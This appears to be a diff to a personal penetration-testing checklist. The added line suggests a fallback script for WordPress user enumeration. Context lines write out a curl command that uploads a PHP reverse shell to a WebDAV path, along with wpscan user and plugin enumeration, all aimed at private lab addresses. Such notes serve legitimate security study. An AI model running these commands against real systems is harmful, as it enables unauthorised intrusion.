@@ -23,6 +23,7 @@
     - `curl --upload-file  php-reverse-shell.txt -v --url http://192.168.142.131/test/shell.php -0 --http1.0`
 1. cms scan (? todo: read it from a tool)
     - `wpscan` (wordpress) - `wpscan -u http://192.168.56.223/bull/ --enumerate u --enumerate p` # scan vulnerable plugin and find user names
+    - if `wpscan` can't enumrate user, try the script at `~/scripts/wpscan_user.zsh`
     - `joomscan` (joombla)
     - `drupalscan`(?)
 1. WebDAV scan
